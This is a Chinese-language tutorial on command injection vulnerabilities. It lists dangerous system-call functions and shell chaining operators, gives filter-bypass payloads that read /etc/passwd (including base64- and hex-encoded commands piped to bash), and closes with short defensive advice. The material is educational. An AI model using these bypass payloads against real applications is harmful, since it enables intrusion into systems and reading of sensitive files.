##### 命令注入漏洞简介

命令注入，主要指应用在服务器或客户端上，允许拼接系统命令并执行而造成的漏洞。

##### 漏洞成因

1. 对用户的输入过滤不全，导致可执行任意系统命令
2. 应用使用了一些危险的系统调用函数，使得用户的输入传递给这些危险的系统调用函数，从而执行了系统命令

##### 一些常见的变成语言的系统调用函数

1. PHP

   ```php
   system
   exec
   shell_exec
   proc_open
   passthru
   ```

2. Python

   ```python
   system
   popen
   subprocess.call
   spawn
   ```

1. Java

   ```java
   java.lang.Runtime.getRuntime().exec(command)
   ```

##### 常见命令拼接符

```bash
1. && 逻辑与
cmd1 && cmd2 cmd1执行成功后才会执行cmd2

2. | 管道
cmd1 | cmd2 cmd1执行的结果作为cmd2的执行条件传递给cmd2

3. || 或
cmd1 || cmd2 cmd1执行失败后就执行cmd2

4. & 用于分割多条命令，命令会按顺序执行
cmd1 & cmd2

5. ; 用于分割多条命令，命令会按顺序执行
cmd1;cmd2

6. `` 命令结果的输出，即命令替换
`echo hello`

7. $() 用于命令替换，适用于cmd中需要使用多个拼接符
$(cmd)

8. () 合并多条命令，重新开启子shell来执行命令
(cmd1;cmd2)

9. {} linux bash下用于合并多个命令及参数，在当前shell执行
{cmd;arg}
```

##### 常见的绕过技巧

1. IFS分割符(Internal Field Seperator, 内部域分割符)是shell下的特殊环境变量，可以是空格，Tab,换行符或其他自定义符号

   ```bash
   cat$IFS/etc/passwd
   ```

2. URL编码

   ```bash
   cat%20/etc/passwd
   cat+/etc/passwd
   cat%90/etc/passwd
   ```

3. {cmd,arg}

   ```bash
   {cat,etc/passwd}
   ```

4. shell特殊变量

   | 变量 |                  描述                   |
   | :--: | :-------------------------------------: |
   |  $n  | 传递给脚本或函数的参数，n代表第几个参数 |
   |  $*  |       传递给脚本或函数的所有参数        |
   |  $@  |        递给脚本或函数的所有参数         |

   ```bash
   cat$1t /etc/passwd
   cat$*t /etc/passwd
   cat$@t /etc/passwd
   ```

5. 编码绕过

   使用编码的方式将命令进行编码(hex,URL,base64)，然后再换回来

   ```bash
   echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d|bash
   
   echo "636174202f6574632f706173737764" |xxd -r -p|bash
   ```

6. 自定义变量(将命令拆分到各个变量中，然后在拼接起来)

   ```bash
   a=c;b=at;c="/etc/passwd";$a$b $c
   ```

7. 反斜杠(反斜杠的作用就是转义，因此可用来拆分黑名单字符串)

   ```bash
   c\a\t /et\c/pass\wd
   ```

8. 单双引号

   单双引号内的内容会被当作字符串处理

   ```bash
   c"a"t /et''c/pa's'swd
   ```

##### 如何防御

1. 尽量不要执行外部的应用程序或命令
2. 尽量不要使用系统调用函数
3. 对用户的输入进行双向过滤



---

that's all